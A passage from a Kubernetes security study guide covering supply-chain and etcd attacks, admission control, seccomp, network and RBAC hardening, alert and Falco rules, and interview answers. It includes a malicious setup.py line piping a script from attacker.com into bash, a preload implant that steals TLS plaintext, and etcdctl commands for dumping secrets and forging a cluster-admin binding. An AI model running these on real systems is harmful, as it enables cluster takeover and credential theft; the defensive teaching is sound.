  django==4.2.1
  requests==2.31.0
  payment-utils==1.0.3  ← malicious package, or "requests" (typosquat of "requests")
  
  Malicious setup.py:
  import subprocess
  subprocess.Popen(['bash', '-c', 
    'curl -s https://attacker.com/implant | bash &'])
  
  This runs at BUILD TIME in CI/CD with whatever privileges the build system has.

ATTACK STEP BY STEP (compromised base image):

  1. python:3.11-slim is compromised (via compromised maintainer account)
  
  2. Compromised layer includes: /etc/ld.so.preload → /lib/libimplant.so.1
     libimplant.so.1 hooks: connect(), SSL_write(), SSL_read()
     When any process in the container calls SSL_write():
       → Copy plaintext to attacker's collector (before TLS encryption)
  
  3. Developer builds their image: FROM python:3.11-slim
     The malicious /etc/ld.so.preload is in the base layer
     It's invisible in the Dockerfile (it's baked into the base image)
  
  4. CI/CD builds image, pushes to private registry
     Image is now: legitimate application + malicious base layer
  
  5. Image deployed to production
     Container starts
     /etc/ld.so.preload → libimplant.so loaded into EVERY process
     libimplant: exfiltrates all SSL traffic, harvests credentials
  
  6. Attacker receives: database passwords, JWT tokens, customer PII
     Without any noisy exploit (no CVE exploitation, no privilege escalation)
     The malicious code runs with exactly the application's permissions

DETECTION:
  1. Binary authorization / image signing (Cosign/Notary):
     Image must be signed by known build pipeline identity
     Signed at: build time by CI/CD (Sigstore keyless signing)
     Verified at: admission time by policy controller
  
  2. SCA (Software Composition Analysis) in CI:
     Scan ALL layers of the base image for known malicious content
     Trivy, Grype, Snyk scan for: CVEs, malicious files, unusual LD_PRELOAD entries
  
  3. Runtime security (Falco):
     Alert: "Process loaded library from /etc/ld.so.preload" (unusual for containers)
     Alert: "Outbound connection to non-allowlisted IP from payment-api"
  
  4. Network policy: DENY all egress from pods except approved destinations
     Malicious C2 callbacks are blocked at the network layer

WHY DEFAULT CONFIG FAILS:
  Without image signing enforcement: any image with the right name/tag is deployed.
  Without SCA scanning: malicious layers are invisible.
  Without egress NetworkPolicy: callback to attacker.com succeeds.
  Without runtime security: the implant runs indefinitely undetected.
```

---

### Attack 4: etcd Compromise via Misconfigured Access

```
ETCD ACCESS → CLUSTER OWNER
═══════════════════════════════════════════════════════════════════════════════

SETUP: etcd is exposed on network interface (not just localhost)
       etcd does NOT require client certificates (TLS but no client auth)
       This happens in self-managed clusters that weren't hardened.

ATTACK STEP 1: Discover etcd endpoint
  nmap -p 2379,2380 10.0.0.0/24
  Port 2379 (client) open on 10.0.0.50
  Port 2380 (peer) open on 10.0.0.50

ATTACK STEP 2: Connect to etcd directly
  etcdctl --endpoints=https://10.0.0.50:2379 get "" --prefix --keys-only
  
  Keys returned:
  /registry/secrets/default/default-token-xxxxx
  /registry/secrets/kube-system/...
  /registry/serviceaccounts/...
  /registry/clusterrolebindings/...
  /registry/namespaces/...
  [ALL cluster state is here]

ATTACK STEP 3: Extract all service account tokens (if NOT encrypted at rest)
  etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token
  
  Returns binary proto-encoded Secret object including the token value.
  Decode the proto → get the base64 token → decode → JWT.
  
  Most valuable targets:
  - kube-system namespace secrets (controller manager tokens, etc.)
  - Any secret named like "admin" or "superuser"
  - The cluster admin token

ATTACK STEP 4: Find or create a cluster-admin binding
  etcdctl get /registry/clusterrolebindings/cluster-admin
  
  If no binding for attacker's identity: CREATE ONE DIRECTLY IN ETCD
  
  # Craft a ClusterRoleBinding proto object
  # Write it directly to etcd — bypassing the API server entirely
  # The API server reads from etcd on next reconcile → attacker is now cluster-admin
  
  etcdctl put /registry/clusterrolebindings/attacker-admin <crafted_proto_blob>

ATTACK STEP 5: Full cluster control
  Use cluster-admin token → kubectl get secrets --all-namespaces → all secrets
  kubectl exec → run commands in any pod
  Create new pods with hostPID/hostNetwork → node-level access

DETECTION:
  - etcd audit logs (if enabled): all read/write operations logged
  - Network monitoring: unexpected connections to etcd ports
  - etcd access should only come from the API server's IP

WHY THIS IS POSSIBLE:
  etcd without client certificate authentication is the #1 critical misconfiguration.
  CIS Benchmark, NSA/CISA Kubernetes hardening guide, and k8s.io security docs
  all call this out explicitly.
  Self-managed clusters, kubeadm deployments without hardening, and legacy
  on-prem clusters are frequently misconfigured this way.
```

---

## 6. Security Controls & Defensive Mechanics

### Admission Controller Architecture

```
ADMISSION CONTROL DEFENSE-IN-DEPTH
═══════════════════════════════════════════════════════════════════════════════

LAYER 1: Built-in Admission Plugins (enabled in kube-apiserver flags)
  
  NodeRestriction:
    Prevents kubelets from modifying pods not on their own node
    Prevents kubelets from adding arbitrary labels (which could bypass RBAC)
    
  LimitRanger:
    Enforces resource request/limit defaults
    Prevents pods without resource limits from being scheduled
    
  PodSecurity (1.25+, replaces PSP):
    Three levels: privileged, baseline, restricted
    Enforced per-namespace via labels:
    kubectl label namespace payments pod-security.kubernetes.io/enforce=restricted
    
    "restricted" prohibits:
    - hostNetwork, hostPID, hostIPC
    - privileged containers
    - allowPrivilegeEscalation
    - running as root
    - hostPath volumes
    - capabilities beyond allowed set

LAYER 2: OPA/Gatekeeper (Policy as Code)
  
  ConstraintTemplate (defines policy):
  apiVersion: templates.gatekeeper.sh/v1
  kind: ConstraintTemplate
  metadata: {name: k8srequiredlabels}
  spec:
    targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels
        violation[{"msg": msg}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) > 0
          msg := sprintf("Missing required labels: %v", [missing])
        }
  
  Constraint (applies policy):
  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sRequiredLabels
  spec:
    match: {kinds: [{apiGroups: ["apps"], kinds: ["Deployment"]}]}
    parameters: {labels: ["app", "version", "owner"]}

LAYER 3: Kyverno (Kubernetes-native policies, simpler than OPA)
  
  apiVersion: kyverno.io/v1
  kind: ClusterPolicy
  metadata: {name: disallow-privileged}
  spec:
    validationFailureAction: enforce
    rules:
    - name: check-privileged
      match: {resources: {kinds: [Pod]}}
      validate:
        message: "Privileged containers are not allowed"
        pattern:
          spec:
            containers:
            - =(securityContext):
                =(privileged): "false"

LAYER 4: Image Signing (Cosign/Binary Authorization)
  
  # Sign image at build time (CI/CD):
  cosign sign --key cosign.key registry.corp.com/payments/api:v1.2.3
  
  # Policy: only admit images with valid signatures
  apiVersion: policy.sigstore.dev/v1alpha1
  kind: ClusterImagePolicy
  spec:
    images:
    - glob: "registry.corp.com/**"
    authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
        - issuer: https://token.actions.githubusercontent.com
          subject: "https://github.com/myorg/myrepo/.github/workflows/build.yml@refs/heads/main"
  
  Enforcement: only images signed by the CI/CD pipeline (GitHub Actions OIDC identity) are admitted.
  An attacker who pushes a malicious image cannot sign it with the CI/CD identity.
```

---

### Seccomp and AppArmor Deep Dive

```
SECCOMP PROFILE: runtime/default (what Kubernetes applies)
═══════════════════════════════════════════════════════════════════════════════

Seccomp (Secure Computing Mode) uses Berkeley Packet Filter (BPF) to filter
system calls. Each syscall has a number; the seccomp BPF program decides:
ALLOW, KILL_PROCESS, ERRNO, TRAP, TRACE.

The "runtime/default" profile BLOCKS these syscalls (among others):
  - acct           ← process accounting
  - add_key        ← kernel keyring
  - bpf            ← BPF program loading (!!!)
  - clock_adjtime  ← NTP time adjustment
  - clock_settime  ← set system time
  - create_module  ← load kernel module
  - delete_module  ← remove kernel module
  - finit_module   ← load kernel module from file descriptor
  - get_kernel_syms ← deprecated
  - get_mempolicy  ← NUMA memory policy
  - init_module    ← load kernel module
  - ioperm         ← I/O port permissions
  - iopl           ← I/O privilege level
  - kcmp           ← compare kernel structures
  - kexec_load     ← load new kernel
  - keyctl         ← kernel key management
  - lookup_dcookie ← dcookie (filesystem)
  - mbind          ← NUMA memory binding
  - mount          ← mount filesystems (CRITICAL: blocks host mount)
  - move_pages     ← move pages between nodes
  - name_to_handle_at ← open by handle
  - nfsservctl     ← NFS server syscall
  - open_by_handle_at ← open file by handle
  - perf_event_open ← perf monitoring
  - personality    ← set process execution domain
  - pivot_root     ← change root filesystem
  - process_vm_readv ← read another process's memory (!!!)
  - process_vm_writev ← write to another process's memory (!!!)
  - ptrace         ← process tracing (CRITICAL: blocks debugger attacks)
  - reboot         ← reboot/halt system
  - request_key    ← kernel keyring
  - set_mempolicy  ← NUMA memory policy
  - setns          ← join a different namespace (CRITICAL)
  - swapon/swapoff ← swap management
  - sysfs          ← deprecated
  - _sysctl        ← sysctl (via syscall, not /proc)
  - umount2        ← unmount
  - unshare        ← unshare namespaces (CRITICAL: blocks creating new namespaces)
  - uselib         ← use shared library
  - userfaultfd    ← user-space page fault handling
  - ustat          ← deprecated filesystem stats
  - vm86/vm86old   ← 8086 emulation (x86 only)

KEY SECURITY IMPLICATIONS:
  - ptrace BLOCKED → attacker cannot debug/trace other processes (limits lateral movement)
  - mount BLOCKED → cannot mount /dev/sda1 (blocks privileged escape technique)
  - setns BLOCKED → cannot switch to host namespace
  - unshare BLOCKED → cannot create new privileged namespaces
  - bpf BLOCKED → cannot load new BPF programs (prevents bypassing seccomp itself)
  - process_vm_readv BLOCKED → cannot read other processes' memory

IMPORTANT: runtime/default is NOT applied by default in k8s < 1.27
  Must be explicitly set:
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  
  OR use the alpha feature gate SeccompDefault in 1.25-1.27
  OR cluster-wide in kube-apiserver: --seccomp-default
```

---

## 7. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════════════════╗
║             KUBERNETES COMPLETE ATTACK SURFACE MAP                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXTERNAL SURFACES (internet-reachable or accessible by external parties)
═══════════════════════════════════════════════════════════════════════════════

ENTRY 1: Kubernetes API Server :6443
  Auth: Required (kubeconfig, OIDC, cert)
  Exposed to: developers, CI/CD, internal services
  Attack: Stolen kubeconfig → full cluster access
  Attack: Compromised CI/CD token → deploy malicious workloads
  Attack: Credential stuffing on OIDC endpoint

ENTRY 2: Ingress Controller (nginx/traefik/istio-gateway) :443/:80
  Auth: Application-level
  Exposed to: Internet (public-facing)
  Attack: Web application vulnerabilities → pod RCE
  Attack: SSRF via application → reach internal services
  Attack: Ingress rule misconfiguration → reach wrong backend

ENTRY 3: Container Registry
  Auth: Docker credentials / IRSA / Workload Identity
  Attack: Compromise registry credentials → push malicious images
  Attack: Use public registry (Docker Hub) → subject to typosquatting
  Attack: Registry without image signing → inject malicious layers

ENTRY 4: Node SSH / NodePort Services
  Auth: SSH keys / application auth
  Exposed to: Management network
  Attack: Weak SSH keys on EC2 → node access → host escape

INTERNAL SURFACES (reachable from within the cluster)
═══════════════════════════════════════════════════════════════════════════════

ENTRY 5: etcd :2379/:2380
  Auth: Client certificates (MUST be enforced)
  Attack: etcd without client auth → read all secrets, create cluster-admin
  Should be: only accessible from API server IP

ENTRY 6: kubelet API :10250
  Auth: Client certificates
  Attack: Unauthenticated kubelet → exec into any pod on node
  Historically: --anonymous-auth=true was the default!
  Check: --anonymous-auth=false MUST be set

ENTRY 7: Cloud Metadata API 169.254.169.254
  Auth: None (IMDSv1) / Token (IMDSv2)
  Accessible from: ALL pods (unless blocked)
  Attack: SSRF → steal EC2 node role credentials

ENTRY 8: Pod-to-Pod Network (flat by default)
  Auth: None (network-level)
  Attack: Compromised pod → lateral movement to any other pod
  Without NetworkPolicy: free movement

ENTRY 9: Kubernetes Dashboard :8443
  Auth: Service account token / OIDC
  Attack: Dashboard with cluster-admin SA → full cluster control
  (Classic: Kubernetes dashboards exposed to internet with admin access)

ENTRY 10: Admission Webhook Endpoints
  Auth: TLS (client cert from API server)
  Attack: MITM the webhook → bypass all admission controls
  Attack: DoS webhook → if failOpen=true → bypass all policies

MEMORY/PROCESS SURFACES (within a node)
═══════════════════════════════════════════════════════════════════════════════

ENTRY 11: Container Filesystem
  /var/run/secrets/kubernetes.io/serviceaccount/token
  Attack: Read token → authenticate to API server
  
ENTRY 12: Environment Variables
  Common mistake: secrets stored in env vars (visible in pod spec, process list)
  Attack: Read /proc/PID/environ from within pod → steal secrets

ENTRY 13: Shared tmpfs Volumes
  Attack: One container writes malicious data; another container reads it
  (relevant for init container → app container secret injection)
```

```
TRUST BOUNDARY MAP
═══════════════════════════════════════════════════════════════════════════════

[Internet]
    │
    │ HTTPS
    ▼
[Ingress Controller]──NetworkPolicy──[Application Pods]
(DMZ-like namespace)                  (payments namespace)
         │                                    │
         │ Service + NetworkPolicy            │ ServiceAccount token
         ▼                                    ▼
[Internal Services]               [kube-apiserver :6443]
(orders, inventory, etc.)              │ RBAC enforcement
                                       │
                ┌──────────────────────┼────────────────────────┐
                ▼                      ▼                         ▼
          [etcd :2379]         [kubelet :10250]         [cloud provider API]
          (cluster state)      (node management)        (IAM, S3, etc.)
          mTLS with cert        mTLS with cert            IRSA + OIDC
          NO PUBLIC ACCESS      NODE-LOCAL ONLY           per-pod credentials

TRUST LEVELS:
  ▓▓▓ HIGH TRUST:    etcd, control plane components
  ▒▒▒ MEDIUM TRUST:  Authenticated API server clients (developers)  
  ░░░ LOW TRUST:     Pods (even with valid SA tokens, limited by RBAC)
  ··· ZERO TRUST:    External traffic, unauthenticated requests
```

---

## 8. Failure Modes & Edge Cases

### What Fails Under Load

**API Server etcd Saturation:**

```
FAILURE SCENARIO: API server flooded with LIST requests
  
  A misconfigured informer (e.g., a controller bug) sends:
  GET /api/v1/pods?watch=false every 100ms (should use watch=true)
  
  With 500 controllers: 5,000 LIST requests/second
  
  Each LIST: deserializes ALL pods from etcd (e.g., 50,000 pods)
  Memory allocation: 50,000 pods × 10KB avg = 500MB per LIST
  At 5,000 LIST/sec: API server OOM killed
  
  CASCADING FAILURE:
  1. API server OOM → restart
  2. On restart: all watchers reconnect simultaneously ("watch reconnect storm")
  3. etcd receives thousands of WATCH + LIST requests at once
  4. etcd CPU spikes → Raft leader can't send heartbeats → election timeout
  5. Raft leader election: 150-300ms during which writes fail
  6. API server clients get: ETCD_ERROR → controllers back off
  7. Back-off storms: all controllers retry simultaneously after back-off expires
  
  REAL-WORLD IMPACT: Control plane unavailable for 5-30 minutes
  Workloads continue running (already scheduled) but:
  - No new pod scheduling
  - No Service endpoint updates
  - No secret rotations
  - Readiness probe changes not acted on

DETECTION:
  etcd_server_leader_changes_seen_total (should be near 0, alert if > 2 in 5 min)
  apiserver_request_duration_seconds{verb="LIST"} (latency spike)
  go_memstats_alloc_bytes (API server memory — alert at 80% of limit)
```

---

### Cascading Network Policy Failure

```
FAILURE: OPA/Gatekeeper webhook unavailable → fail-open

  NetworkPolicy is enforced by the CNI plugin (Calico, Cilium)
  NetworkPolicy objects are stored in etcd
  
  Scenario: Calico controller (which reads NetworkPolicy from API server) crashes
  
  Calico uses eBPF programs or iptables rules, pre-compiled from policies
  If Calico controller crashes: NEW policies are not applied
  BUT: existing iptables/eBPF rules remain in kernel until deleted
  
  Risk: Not cascading failure (existing rules still enforced)
  Risk IS: new pods scheduled → calico CNI plugin applies NO NetworkPolicy
           because the controller that syncs policies isn't running
  New pods may have no NetworkPolicy applied (open by default)
  
FAILURE: Admission webhook fails with failurePolicy: Ignore
  
  If the OPA/Gatekeeper webhook is down AND failurePolicy: Ignore:
  ALL admission validation is skipped
  Pods with:
    - privileged: true
    - hostPID: true
    - image from unauthorized registry
    - No resource limits
  All admitted without restriction
  
  This is a common mistake:
  failurePolicy: Ignore allows deployment when security is broken
  failurePolicy: Fail blocks ALL deployments when security is broken
  
  CORRECT APPROACH: 
    Use failurePolicy: Fail for security-critical webhooks
    Have multiple replicas of the webhook server
    Prioritize HA of the webhook server as carefully as the API server
```

---

### noisy Neighbor and Resource Exhaustion

```
NOISY NEIGHBOR WITHOUT RESOURCE LIMITS

  Pod with no resource limits:
  - Can use ALL CPU on the node
  - Can use ALL memory → OOM killer kills OTHER pods on the node
  
  Memory OOM scenario:
  1. payment-api has no memory limit
  2. Memory leak in payment-api code → grows to 8GB
  3. Node has 16GB RAM total
  4. OOM killer activates: looks for process to kill
  5. Kills the process with highest oom_score_adj
  6. By default, Kubernetes sets oom_score_adj based on QoS class:
     BestEffort pods: highest score (killed first)
     Burstable pods: middle
     Guaranteed pods: lowest score (killed last)
  7. If payment-api is Guaranteed (limits = requests): OTHER pods are killed first
  8. Critical infrastructure pods (like Calico, kube-proxy) get killed
  9. Node becomes unstable → evicted → all pods on node lose network connectivity
  
  This is a real-world incident pattern: one pod with a memory leak can take
  down an entire node and all pods scheduled on it.

LIMITS AND REQUESTS TRADEOFFS:
  Request: amount guaranteed to the pod (CPU/memory reserved on the node)
  Limit: maximum the pod can use
  
  CPU limit: implemented via cgroup cpu.cfs_quota_us (throttled, not killed)
  Memory limit: implemented via cgroup memory.limit_in_bytes (killed if exceeded)
  
  Setting memory limit = memory request (Guaranteed QoS):
  PRO: Predictable performance, protected from OOM killer
  CON: Must accurately know peak memory usage (hard for stateful workloads)
  
  NOT setting memory limit:
  PRO: Flexible (handles traffic spikes)
  CON: Noisy neighbor problem, OOM risk for other pods
```

---

## 9. Mitigations & Observability

### Infrastructure as Code Security Controls

```yaml
# SECURE POD SECURITY CONTEXT (template for all production pods)
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      # Service account with minimal permissions
      serviceAccountName: payment-api
      automountServiceAccountToken: false  # Only mount if needed
      
      # Pod-level security
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001          # Non-root UID
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault    # Apply seccomp (not default before k8s 1.27!)
        sysctls: []               # No custom sysctls
      
      # No host namespace sharing
      hostNetwork: false
      hostPID: false
      hostIPC: false
      
      containers:
      - name: payment-api
        image: registry.corp.com/payments/api:v1.2.3  # Full registry, not Docker Hub
        
        securityContext:
          allowPrivilegeEscalation: false  # Cannot gain more privileges than parent
          privileged: false
          readOnlyRootFilesystem: true     # Cannot write to container filesystem
          capabilities:
            drop: ["ALL"]                 # Drop ALL capabilities
            add: []                       # Add back none (adjust only if needed)
        
        resources:
          requests:
            cpu: "100m"      # 0.1 CPU cores guaranteed
            memory: "256Mi"  # 256MB guaranteed
          limits:
            cpu: "500m"      # Maximum 0.5 CPU cores
            memory: "512Mi"  # OOM killed if exceeds 512MB
        
        # Read-only filesystem: mount writable dirs explicitly
        volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /app/cache
      
      volumes:
      - name: tmp
        emptyDir: {}         # Writable but ephemeral, not host-backed
      - name: cache
        emptyDir: {}

---
# NETWORK POLICY: Default deny + explicit allows
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: payments
spec:
  podSelector: {}   # Matches ALL pods in namespace
  policyTypes: [Ingress, Egress]
  # No ingress or egress rules = deny everything

---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-api-allow
  namespace: payments
spec:
  podSelector:
    matchLabels: {app: payment-api}
  policyTypes: [Ingress, Egress]
  ingress:
  - from:
    - namespaceSelector:
        matchLabels: {kubernetes.io/metadata.name: ingress-nginx}
      podSelector:
        matchLabels: {app.kubernetes.io/name: ingress-nginx}
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector: {matchLabels: {app: postgres}}
    ports:
    - protocol: TCP
      port: 5432
  - ports:
    - protocol: UDP
      port: 53   # DNS
    - protocol: TCP
      port: 53   # DNS (TCP fallback)

---
# RBAC: Minimal permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payment-api
  namespace: payments
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789:role/payment-api-role

---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: payment-api
  namespace: payments
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  resourceNames: ["payment-api-config"]  # Named resource, not wildcard
  verbs: ["get"]
# NO secret access via RBAC — use Vault Agent injection instead

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: payment-api
  namespace: payments
subjects:
- kind: ServiceAccount
  name: payment-api
  namespace: payments
roleRef:
  kind: Role
  name: payment-api
  apiGroup: rbac.authorization.k8s.io
```

---

### Critical Metrics and Logging

```
AUDIT LOG CONFIGURATION (kube-apiserver)
─────────────────────────────────────────────────────────────────────────────
# /etc/kubernetes/audit-policy.yaml

apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# CRITICAL: Log all secret access (full request + response)
- level: RequestResponse
  resources:
  - group: ""
    resources: ["secrets"]
    
# CRITICAL: Log all exec/attach (full metadata including command)
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods/exec", "pods/attach", "pods/portforward"]
    
# CRITICAL: Log RBAC changes
- level: RequestResponse
  resources:
  - group: "rbac.authorization.k8s.io"
    resources: ["clusterrolebindings", "rolebindings", "clusterroles", "roles"]
    
# Log all auth failures
- level: Metadata
  omitStages: ["RequestReceived"]
  verbs: ["*"]
  namespaces: ["*"]
  nonResourceURLs: []
  users: []
  userGroups: []
  # Filtered to just failed requests in the log processor

# Skip high-volume, low-value logs to reduce noise
- level: None
  users: ["system:kube-proxy"]
  verbs: ["watch"]
  resources: [{group: "", resources: ["endpoints", "services", "services/status"]}]
  
- level: None
  userGroups: ["system:nodes"]
  verbs: ["get", "list", "watch"]
  resources:
  - {group: "", resources: ["nodes", "nodes/status"]}
```

---

### Alert Rules

```
PROMETHEUS ALERTING RULES
─────────────────────────────────────────────────────────────────────────────

groups:
- name: kubernetes-security
  rules:
  
  # P1: Privileged container launched (should have been blocked by admission)
  - alert: PrivilegedContainerDetected
    expr: |
      kube_pod_container_info{container!=""} 
      * on(pod, namespace) 
      kube_pod_spec_container_security_context_privileged == 1
    for: 0m
    labels: {severity: critical}
    annotations:
      summary: "Privileged container {{ $labels.container }} in {{ $labels.namespace }}/{{ $labels.pod }}"
  
  # P1: Pod running as root AND no seccomp
  - alert: RootContainerNoSeccomp
    expr: |
      kube_pod_container_info 
      * on(pod,namespace) 
      (kube_pod_spec_container_security_context_run_as_user == 0
       OR kube_pod_spec_container_security_context_run_as_non_root == 0)
    for: 2m
    labels: {severity: high}
  
  # P1: etcd leader change (indicates instability)
  - alert: EtcdLeaderChange
    expr: changes(etcd_server_leader_changes_seen_total[5m]) > 2
    for: 0m
    labels: {severity: critical}
  
  # P2: Anomalous API server request rate (possible reconnaissance)
  - alert: HighAPIServerErrorRate
    expr: |
      sum(rate(apiserver_request_total{code=~"4[0-9]{2}"}[5m])) 
      / sum(rate(apiserver_request_total[5m])) > 0.1
    for: 5m
    labels: {severity: warning}
  
  # P2: Container escape indicator — unexpected privileged syscall
  # (requires Falco metrics bridge)
  - alert: FalcoContainerEscapeAttempt
    expr: falco_events{rule="Write below root"} > 0
    labels: {severity: critical}
  
  # P2: Unexpected outbound connection from pod
  - alert: UnexpectedEgressTraffic
    expr: |
      sum by (pod, namespace, dst_ip) (
        rate(cilium_drop_count_total{direction="egress",reason!="Policy denied"}[5m])
      ) > 0
    labels: {severity: warning}

WHAT NOT TO ALERT ON (avoid false positive fatigue):
  - Individual 404s from health checks
  - Normal cert rotation events (expected every 30-90 days)
  - Admission webhook timeouts that retry successfully
  - Pod pending state < 60 seconds (normal scheduling)
  - Liveness probe failures < 3 consecutive (normal transient)
  - CrashLoopBackOff for initial startup (grace period needed)
```

---

### Key Observability Signals

```
FALCO RULES (runtime security):
  
  # Container escaping via nsenter
  - rule: Container Namespace Escape
    desc: Detect use of nsenter to escape container namespace
    condition: |
      container and
      spawned_process and
      proc.name = "nsenter"
    output: "nsenter executed inside container (pod=%k8s.pod.name namespace=%k8s.ns.name)"
    priority: CRITICAL
  
  # Reading sensitive host paths
  - rule: Read Sensitive File From Container
    desc: Attempt to read sensitive files from mounted host filesystem
    condition: |
      container and
      open_read and
      (fd.name startswith /mnt/hostfs/etc/shadow or
       fd.name startswith /mnt/hostfs/var/lib/kubelet)
    output: "Sensitive file read from container"
    priority: HIGH
  
  # k8s metadata access (SSRF to IMDS)
  - rule: Contact Cloud Metadata Service
    desc: Detect connection to cloud metadata service from container
    condition: |
      container and
      (fd.sip = "169.254.169.254" or fd.sip = "100.100.100.200")
    output: "Cloud metadata access from container (pod=%k8s.pod.name cmd=%proc.cmdline)"
    priority: CRITICAL

KEY METRICS TO MONITOR:
  
  Control Plane Health:
  - apiserver_request_duration_seconds (p99 > 1s = degraded)
  - etcd_server_has_leader (= 0 is critical)
  - etcd_server_leader_changes_seen_total (> 2 in 5min = concerning)
  - kube_node_status_condition{condition="Ready",status="true"} per node
  
  Security Signals:
  - apiserver_audit_event_total by verb/resource/user (spike = reconnaissance)
  - falco_events by rule (any = investigate)
  - kube_pod_container_status_running with privileged=true (should = 0 in restricted namespaces)
  
  Workload Health:
  - kube_deployment_status_replicas_unavailable (cascade failure indicator)
  - container_oom_events_total (memory limits too low or leak)
  - kube_node_status_allocatable_memory_bytes vs kube_pod_container_resource_requests_memory_bytes
    (approaching node memory saturation)
```

---

## 10. Interview Questions

### Q1: Explain the exact flow of a Kubernetes API server request, including every admission controller phase. If a mutating webhook crashes and its `failurePolicy` is `Ignore`, what are the security implications? What's the engineering tradeoff with `Fail`?

**Direct answer:**

The API server processes a request in this exact order: **Authentication** (who are you?), then **Authorization** (are you allowed to do this?), then **Admission** (does this request comply with policy?), then finally **Validation/Persistence** (is the object schema valid, and write to etcd).

The admission phase splits into two sub-phases: **mutating webhooks** run first and can modify the object. **Validating webhooks** run second and can only allow or deny. Built-in admission plugins (PodSecurity, LimitRanger, etc.) are interleaved with the webhook phases.

If a mutating webhook crashes with `failurePolicy: Ignore`: all mutations that webhook was supposed to perform are silently skipped. If this webhook was injecting the Vault Agent sidecar, pods are now deployed without secret injection. If it was injecting Istio sidecars, pods have no mTLS enforcement. If it was setting security defaults (seccompProfile, drop capabilities), pods run with broader permissions than intended — with no error, no alert, no indication anything went wrong. The deployment succeeds. This is the most dangerous failure mode in Kubernetes admission control.

The engineering tradeoff with `failurePolicy: Fail`: if the webhook server is down (OOMKilled, during a rolling update, in a multi-AZ cluster with an AZ outage), ALL deployments fail until the webhook recovers. This is highly visible and painful for developers ("kubectl apply is returning 500 errors"). But it forces you to invest in webhook server high availability. In production, you need at minimum 3 replicas of the webhook server with pod disruption budgets, spread across AZs.

The correct answer for security-critical webhooks: `failurePolicy: Fail` with the webhook server running with proper HA, HPA, and a dedicated `PriorityClass` higher than normal workloads so it's not evicted under resource pressure.

---

### Q2: A container escape has occurred. An attacker has gained root on a worker node. What can they do NOW, and what architectural controls would have limited the blast radius?

**Direct answer:**

With root on a worker node, the attacker can immediately:

1. **Read all service account tokens on that node**: `/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token`. These are JWT tokens for every pod running on the node. Depending on RBAC policies, these range from useless (minimal SA) to devastating (SA with cluster-wide permissions).

2. **Use the kubelet client certificate** to authenticate to the API server as `system:node:<nodename>`. The Node authorizer limits this to node-relevant operations, but it still gives read access to all pods on this node.

3. **Read secrets mounted into pods**: all container filesystems, environment variables, tmpfs volumes are accessible from the host via `/proc/<pid>/root/` or by reading the overlay filesystem directly.

4. **Attack pods on other nodes**: if the cluster uses a flat network (no NetworkPolicy), the attacker on node-42 can send traffic to pods on node-43. They can attempt to exploit application vulnerabilities in adjacent pods.

5. **Access the cloud metadata service**: the node's IAM role (EC2 instance profile, GCE service account) is accessible, potentially giving AWS/GCP credentials.

**Architectural controls to limit blast radius:**

- **Node isolation**: use separate node pools per trust level (one node pool for payment pods, another for internal tools). A compromise of a payments pod node doesn't expose internal tool pods.
- **Minimal SA permissions**: pods should have the least-privileged SA possible. An attacker who grabs the SA token gets minimal capability.
- **Secrets not stored in files**: use Vault Agent with in-memory injection, not file-based injection. No secret files on the host filesystem.
- **IMDSv2 enforcement**: puts a barrier before IMDS access (requires a PUT with a TTL first).
- **Short-lived projected tokens**: the SA tokens have 1-hour TTLs. An attacker must act quickly.
- **Encrypted etcd at rest**: if the attacker reads etcd directly (less likely from a worker node, but possible via kubelet credentials), secrets are encrypted.

---

### Q3: How does Kubernetes RBAC actually evaluate `can user X do verb Y on resource Z?` What is the difference between a Role, ClusterRole, RoleBinding, and ClusterRoleBinding? Why is there no DENY rule, and what's the security implication?

**Direct answer:**

RBAC evaluation is purely additive. When a request arrives, the API server collects ALL rules that apply to the requesting subject (user, service account, or group), looks for any rule that MATCHES the request (verb + resource + namespace), and returns ALLOW if any match exists. If no match: implicit DENY.

- **Role**: scoped to a single namespace. Grants verbs on resources WITHIN that namespace only.
- **ClusterRole**: cluster-scoped. Can be used to grant permissions across all namespaces (via ClusterRoleBinding) OR within a single namespace (via RoleBinding). This asymmetry is important: a RoleBinding can reference a ClusterRole, but the binding constrains the permissions to that namespace.
- **RoleBinding**: binds a Role OR ClusterRole to subjects within a specific namespace.
- **ClusterRoleBinding**: binds a ClusterRole to subjects cluster-wide.

There is no DENY rule because RBAC was designed around the principle of "enumerate what is allowed, deny everything else." A DENY would require defining explicitly what NOT to allow, which is operationally complex when roles are composed.

The security implication: you CANNOT safely give a group a ClusterRole with broad permissions and then try to carve out exceptions. If `developers` group has `get secrets` via one binding, you cannot revoke it for a subgroup — you'd have to restructure the entire permission model. This also means auditing access is harder: to determine if user X can do something, you must enumerate ALL bindings, ALL roles, and evaluate every combination. It's additive, not subtractive.

The practical risk: `cluster-admin` ClusterRoleBinding for a service account means a single compromised pod with that SA has full cluster control. Always use namespaced Roles with RoleBindings, never ClusterRoleBindings, unless truly cluster-wide access is required.

---

### Q4: Explain exactly what happens to network traffic between two pods in different namespaces. At what layer does NetworkPolicy enforcement happen, and what does it NOT protect against?

**Direct answer:**

When pod A (namespace `frontend`, IP `10.0.1.5`) sends a TCP packet to pod B (namespace `backend`, IP `10.0.2.8`):

